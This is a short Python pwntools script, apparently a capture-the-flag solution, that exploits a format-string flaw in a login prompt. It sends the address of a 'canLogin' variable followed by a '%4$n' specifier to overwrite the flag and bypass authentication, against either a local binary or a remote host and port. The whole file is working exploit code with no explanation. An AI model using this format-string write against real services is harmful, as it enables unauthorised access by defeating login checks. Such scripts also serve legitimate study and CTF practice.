#!/usr/bin/python3.10
import pwn
import sys

if __name__ == '__main__':
    localMode = len(sys.argv) != 3
    canLogin = 0x080e419c
    payload = pwn.p32(canLogin)
    payload += b'%4$n'
    target = None

    if localMode:
        target = pwn.process(sys.argv[1])  # Use local file
    else:
        server = sys.argv[1]
        port = int(sys.argv[2])
        target = pwn.remote(server, port)  # Connect to the server

    target.sendlineafter(b': ', payload)
    print(target.recvall().decode("utf-8", "ignore").strip())

# 0x80E419C